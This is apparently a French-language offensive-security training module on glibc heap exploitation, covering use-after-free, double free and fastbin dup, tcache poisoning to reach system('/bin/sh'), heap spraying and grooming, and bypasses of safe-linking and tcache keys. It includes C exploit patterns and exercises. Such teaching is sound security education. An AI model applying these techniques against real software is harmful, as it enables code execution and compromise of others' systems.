# Module 31 - Heap Exploitation : Corrupting the Allocator

## Pourquoi tu dois maîtriser ça

```c
// Use-After-Free classique
User *user = malloc(sizeof(User));
user->callback = safe_function;
free(user);                    // Libéré mais pointeur pas NULL

// Attaquant alloue à la même adresse
char *evil = malloc(sizeof(User));
memset(evil, 0, sizeof(User));
*(void**)(evil + 32) = shellcode_addr;  // Écrase le callback

user->callback();  // BOOM - exécute shellcode_addr
```

**Le heap est partout.** Browsers, serveurs, GUI... Comprendre ses vulnérabilités = exploiter des programmes modernes.

---

## Structure d'un chunk malloc (glibc)

> **Chunk** = bloc de mémoire retourné par malloc. Contient des métadonnées en plus des données utilisateur.

```
CHUNK ALLOUÉ:
┌─────────────────────────────────┐
│  prev_size (si précédent libre) │  8 bytes
├─────────────────────────────────┤
│  size  │ A │ M │ P │            │  8 bytes (flags dans bits bas)
├─────────────────────────────────┤
│                                 │
│  USER DATA                      │  ← malloc() retourne cette adresse
│                                 │
└─────────────────────────────────┘

CHUNK LIBÉRÉ (fastbin):
┌─────────────────────────────────┐
│  prev_size                      │
├─────────────────────────────────┤
│  size                           │
├─────────────────────────────────┤
│  fd (forward pointer)           │  ← Pointe vers prochain chunk libre
├─────────────────────────────────┤
│  bk (backward pointer)          │  ← Si pas fastbin
└─────────────────────────────────┘
```

**Flags dans size :**
- **P (PREV_INUSE)** : chunk précédent utilisé
- **M (IS_MMAPPED)** : alloué via mmap
- **A (NON_MAIN_ARENA)** : pas dans l'arène principale

---

## Bins : Où vont les chunks libérés

| Bin | Taille | Structure | Coalescing |
|-----|--------|-----------|------------|
| **Fastbin** | ≤ 80 bytes | LIFO (pile) | Non |
| **Tcache** | Variable (≤ 7/taille) | LIFO | Non |
| **Unsorted** | Tous récents | FIFO | Oui |
| **Small** | < 512 bytes | Exact | Oui |
| **Large** | ≥ 512 bytes | Plages | Oui |

> **LIFO** = Last In First Out. Le dernier libéré est le premier réalloué.

---

## Use-After-Free (UAF)

> **UAF** = utiliser un pointeur après que sa mémoire a été libérée. La mémoire peut contenir des données contrôlées par l'attaquant.

### Le mécanisme

```
ÉTAT 1: Après malloc
victim_ptr ──→ [ User object ]

ÉTAT 2: Après free(victim_ptr)
victim_ptr ──→ [ freed chunk ] ← Dans freelist
                     ↓
                fastbin head

ÉTAT 3: Après evil = malloc(same_size)
victim_ptr ──→ [ evil data ]  ← MÊME ADRESSE !
evil_ptr   ──→

ÉTAT 4: victim_ptr->callback()
Exécute ce que l'attaquant a mis dans evil data !
```

### Exemple exploitable

```c
typedef struct {
    char name[32];
    void (*callback)(void);  // Offset 32
} User;

User *user = malloc(sizeof(User));
user->callback = safe_function;

free(user);
// BUG: user pas mis à NULL

char *evil = malloc(sizeof(User));  // Même taille = même chunk !
*(void**)(evil + 32) = shellcode_addr;

user->callback();  // UAF → exécute shellcode_addr
```

### Exploitation pattern

```c
void exploit_uaf(void) {
    // 1. Créer l'objet victime
    VulnObject *obj = create_object();

    // 2. Libérer (le bug: pointeur pas nullifié)
    delete_object(obj);  // free() mais pas obj = NULL

    // 3. Heap spray avec payload
    for (int i = 0; i < 100; i++) {
        char *spray = malloc(sizeof(VulnObject));
        // Placer shellcode_addr à l'offset du callback
        *(void**)(spray + CALLBACK_OFFSET) = shellcode_addr;
    }

    // 4. Déclencher l'utilisation
    trigger_object_use(obj);  // → shellcode !
}
```

---

## Double Free

> **Double Free** = libérer deux fois le même chunk. Corrompt la freelist → allocations à des adresses arbitraires.

### Le problème

```
free(ptr);
free(ptr);  // Double free !

Freelist corrompue:
fastbin → [chunk A] → [chunk A] → ...
                         ↑
                    Boucle infinie !
```

### Fastbin Dup (bypass de protection)

```c
// Protection: glibc vérifie si chunk == top of freelist
// Bypass: intercaler une autre libération

void *a = malloc(0x30);
void *b = malloc(0x30);

free(a);  // fastbin: [a]
free(b);  // fastbin: [b] → [a]
free(a);  // fastbin: [a] → [b] → [a]  ← Double free !

// Maintenant:
void *c = malloc(0x30);  // Retourne a
void *d = malloc(0x30);  // Retourne b
void *e = malloc(0x30);  // Retourne a ENCORE !

// c et e pointent vers la MÊME mémoire !
```

### Arbitrary write via double free

```c
// Après le double free fastbin: [a] → [b] → [a]

void *c = malloc(0x30);  // Obtient 'a'

// Écrire dans 'c' modifie le fd pointer de 'a' dans la freelist
*(void**)c = target_address;  // fd = target_address

void *d = malloc(0x30);  // Obtient 'b'
void *e = malloc(0x30);  // Obtient 'a'
void *f = malloc(0x30);  // Obtient target_address !

// On peut maintenant écrire à target_address via f
```

---

## Tcache Poisoning (glibc 2.26+)

> **Tcache** = cache par thread, plus rapide mais moins sécurisé que fastbins.

### Structure

```c
struct tcache_entry {
    struct tcache_entry *next;  // Prochain chunk libre
    struct tcache_perthread_struct *key;  // Protection double-free (2.29+)
};
```

### Attaque (glibc < 2.32)

```c
// Sans safe-linking, on peut directement écraser 'next'
void *a = malloc(0x20);
free(a);

// Écraser le next pointer dans le tcache entry
*(void**)a = __free_hook;  // Ou autre target

void *b = malloc(0x20);  // Retourne a
void *c = malloc(0x20);  // Retourne __free_hook !

// Écrire system dans __free_hook
*(void**)c = system;

// Déclencher
free("/bin/sh");  // → system("/bin/sh")
```

---

## Heap Spray

> **Heap Spray** = remplir le heap avec des données répétitives pour augmenter les chances d'atterrir sur notre payload.

### Concept

```
┌─────────────────────────────────────────────┐
│ 0x10000000  [NOP sled + shellcode]         │
│ 0x10001000  [NOP sled + shellcode]         │
│ 0x10002000  [NOP sled + shellcode]         │
│ ...                                         │
│ 0x20000000  [NOP sled + shellcode]         │
└─────────────────────────────────────────────┘

Sauter à n'importe quelle adresse entre 0x10000000 et 0x20000000
→ Atterrit dans un NOP sled → shellcode exécuté
```

### Implémentation

```c
#define SPRAY_COUNT 1000
#define SPRAY_SIZE  0x10000  // 64 KB

void heap_spray(void) {
    void *sprayed[SPRAY_COUNT];
    unsigned char *payload = malloc(SPRAY_SIZE);

    // NOP sled
    memset(payload, 0x90, SPRAY_SIZE);

    // Shellcode à la fin
    memcpy(payload + SPRAY_SIZE - sizeof(shellcode), shellcode, sizeof(shellcode));

    // Spray !
    for (int i = 0; i < SPRAY_COUNT; i++) {
        sprayed[i] = malloc(SPRAY_SIZE);
        memcpy(sprayed[i], payload, SPRAY_SIZE);
    }

    // Maintenant, sauter à 0x0c0c0c0c devrait fonctionner
}
```

### Pour UAF

```c
void spray_for_uaf(void *fake_vtable) {
    for (int i = 0; i < 1000; i++) {
        VictimObject *fake = malloc(sizeof(VictimObject));
        fake->vtable = fake_vtable;  // Notre fausse vtable
        memset(fake->data, 'A', sizeof(fake->data));
    }
    // Un pointeur dangling pointe maintenant vers notre faux objet
}
```

---

## Heap Grooming (Feng Shui)

> **Heap Grooming** = contrôler le layout du heap pour placer les chunks où on veut.

### Technique

```
ÉTAPE 1: Allocations initiales
┌───┬───┬───┬───┬───┬───┐
│ A │ B │ C │ D │ E │ F │
└───┴───┴───┴───┴───┴───┘

ÉTAPE 2: Libérer B et D (créer des trous)
┌───┬───┬───┬───┬───┬───┐
│ A │   │ C │   │ E │ F │
└───┴───┴───┴───┴───┴───┘

ÉTAPE 3: Allocations ciblées
┌───┬───────┬───┬──────┬───┬───┐
│ A │victim │ C │ evil │ E │ F │
└───┴───────┴───┴──────┴───┴───┘

Maintenant evil peut overflow dans victim !
```

### Code

```c
void heap_groom(void) {
    void *chunks[100];

    // Phase 1: Remplir
    for (int i = 0; i < 100; i++) {
        chunks[i] = malloc(0x80);
    }

    // Phase 2: Créer des trous alternés
    for (int i = 0; i < 100; i += 2) {
        free(chunks[i]);
        chunks[i] = NULL;
    }

    // Phase 3: Allocations prévisibles
    void *target = malloc(0x80);   // Premier trou
    void *attacker = malloc(0x80); // Trou suivant = adjacent !
}
```

---

## Protections modernes

### Safe-Linking (glibc 2.32+)

> Les pointeurs fd/next sont masqués : `next_masked = next XOR (chunk_addr >> 12)`

**Bypass :** Leak heap address → calculer le mask → forger le pointeur.

### Tcache Key (glibc 2.29+)

> Chaque chunk tcache a un `key` qui détecte les double-free.

**Bypass :** Écraser le key avant le double free.

### Pointer Guard

> Pointeurs de fonction masqués avec un cookie secret.

**Bypass :** Leak le cookie (dans TLS).

---

## Exercices pratiques

### Exo 1 : UAF basique (15 min)
Compile le programme vulnérable et exploite l'UAF pour appeler une fonction win().

### Exo 2 : Double free (20 min)
Exploite un double free pour écrire à une adresse arbitraire.

### Exo 3 : Heap spray (15 min)
Implémente un heap spray et vérifie avec GDB que les données sont bien placées.

### Exo 4 : Tcache poisoning (25 min)
Sur glibc < 2.32, exploite le tcache pour obtenir un shell.

---

## Checklist

```
□ Je comprends la structure d'un chunk malloc
□ Je connais les différents bins (fastbin, tcache, unsorted...)
□ Je sais identifier et exploiter un UAF
□ Je comprends le double free et fastbin dup
□ Je sais faire un heap spray
□ Je connais les protections modernes (safe-linking, tcache key)
□ Je maîtrise le heap grooming pour contrôler le layout
```

---

## Glossaire express

| Terme | Définition |
|-------|------------|
| **Chunk** | Bloc mémoire avec métadonnées |
| **Fastbin** | Liste de chunks libres < 80 bytes, LIFO |
| **Tcache** | Cache par thread, plus rapide |
| **UAF** | Use-After-Free - utiliser mémoire libérée |
| **Double Free** | Libérer deux fois le même chunk |
| **fd/bk** | Forward/Backward pointers dans chunks libres |
| **Heap Spray** | Remplir le heap de données répétitives |
| **Grooming** | Contrôler le layout du heap |
| **Safe-Linking** | Protection par masquage des pointeurs |

---

## Prochaine étape

**Phase suivante →** OS-spécifique (Windows/Linux/macOS)

---

**Temps lecture :** 12 min | **Pratique :** 60 min
